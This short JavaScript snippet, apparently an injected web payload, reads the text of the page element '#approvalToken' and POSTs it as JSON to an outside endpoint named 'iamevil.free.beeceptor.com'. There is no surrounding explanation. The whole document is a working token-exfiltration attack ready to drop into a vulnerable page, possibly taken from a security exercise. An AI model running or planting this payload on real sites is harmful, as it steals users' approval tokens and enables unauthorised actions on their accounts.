fetch('https://iamevil.free.beeceptor.com/', {
  method: 'POST',
  body: JSON.stringify({ token: document.querySelector("#approvalToken").textContent }),
  headers: {
    "Content-Type": "application/json"
  }
});
